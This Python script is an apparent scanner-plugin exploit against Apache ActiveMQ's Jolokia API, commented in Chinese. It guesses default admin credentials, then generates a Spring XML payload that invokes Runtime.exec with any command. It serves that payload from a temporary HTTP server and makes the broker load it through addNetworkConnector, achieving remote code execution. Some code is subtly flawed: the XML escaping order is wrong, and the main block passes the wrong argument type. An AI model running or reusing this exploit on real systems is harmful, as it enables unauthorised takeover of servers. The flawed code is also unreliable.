import requests
import json
import socket
import threading
import random
import string
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "activemq"),
    ("admin", ""),
    ("artemis", "artemis"),
]

def _check_jolokia(target, username=None, password=None):
    endpoint = f"{target.rstrip('/')}/api/jolokia/"
    auth = None
    if username is not None and password is not None:
        from requests.auth import HTTPBasicAuth
        auth = HTTPBasicAuth(username, password)
    try:
        resp = requests.get(endpoint, auth=auth, verify=False, timeout=10)
        if resp.status_code == 200:
            return True, resp.json()
        elif resp.status_code == 401:
            return False, "unauthorized"
        else:
            return False, resp.status_code
    except Exception as e:
        return False, str(e)

def _try_default_creds(target):
    for u, p in DEFAULT_CREDENTIALS:
        ok, _ = _check_jolokia(target, u, p)
        if ok:
            return u, p
    return None, None

def _verify(target):
    """验证漏洞是否存在：检查 Jolokia 接口是否可访问（使用默认凭据）"""
    url = target["target"]
    u, p = _try_default_creds(url)
    if u is None:
        # 尝试无认证
        ok, detail = _check_jolokia(url)
        if ok:
            return {'target': url, 'result': f'Jolokia接口可访问，无需认证：{json.dumps(detail)[:200]}'}
        else:
            return None
    else:
        # 有凭据，进一步检查是否可以列出MBeans
        endpoint = f"{url.rstrip('/')}/api/jolokia/"
        list_payload = {"type": "list", "path": "org.apache.activemq"}
        auth = None
        from requests.auth import HTTPBasicAuth
        auth = HTTPBasicAuth(u, p)
        try:
            resp = requests.post(endpoint, json=list_payload, auth=auth, verify=False, timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if 'org.apache.activemq' in str(data.get('value', {})):
                    return {'target': url, 'result': 'Jolokia认证成功，可访问ActiveMQ MBeans，存在漏洞利用条件'}
        except:
            pass
        return {'target': url, 'result': 'Jolokia接口可访问，凭据有效'}

def _generate_malicious_xml(command):
    escaped_cmd = command.replace('"', '&quot;').replace('&', '&amp;')
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="cmd" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetClass" value="java.lang.Runtime"/>
        <property name="targetMethod" value="getRuntime"/>
    </bean>
    <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetObject" ref="cmd"/>
        <property name="targetMethod" value="exec"/>
        <property name="arguments" value="{escaped_cmd}"/>
    </bean>
</beans>'''
    return xml

def _serve_xml(xml_content, port):
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Type', 'application/xml')
            self.end_headers()
            self.wfile.write(xml_content.encode())
        def log_message(self, format, *args):
            pass
    server = HTTPServer(('0.0.0.0', port), Handler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True
    thread.start()
    return server

def _cmd_exc(target, cmd):
    """命令执行：在本地启动临时HTTP服务器托管恶意XML，然后触发Jolokia RCE"""
    url = target["target"]
    # 获取本地IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"
    port = random.randint(20000, 60000)
    xml_content = _generate_malicious_xml(cmd)
    server = _serve_xml(xml_content, port)
    xml_url = f"http://{local_ip}:{port}/malicious.xml"
    # 等待服务器启动
    import time
    time.sleep(0.5)
    # 发送Jolokia请求
    u, p = _try_default_creds(url)
    if u is None:
        return {'target': url, 'result': '无法获取有效凭据，命令执行失败'}
    # 构造恶意URI
    malicious_uri = f"masterslave://?brokerConfig=xbean:{xml_url}"
    payload = {
        "type": "exec",
        "mbean": f"org.apache.activemq:type=Broker,brokerName=localhost",
        "operation": "addNetworkConnector",
        "arguments": [malicious_uri]
    }
    from requests.auth import HTTPBasicAuth
    auth = HTTPBasicAuth(u, p)
    endpoint = f"{url.rstrip('/')}/api/jolokia/"
    try:
        resp = requests.post(endpoint, json=payload, auth=auth, verify=False, timeout=10)
        result_text = f"HTTP {resp.status_code}: {resp.text[:300]}"
        # 关闭服务器
        server.shutdown()
        return {'target': url, 'result': f'命令执行请求已发送，请检查执行结果。服务器响应：{result_text}'}
    except Exception as e:
        server.shutdown()
        return {'target': url, 'result': f'请求异常：{str(e)}'}

if __name__ == "__main__":
    result = _verify('http://example.com')
    print(result)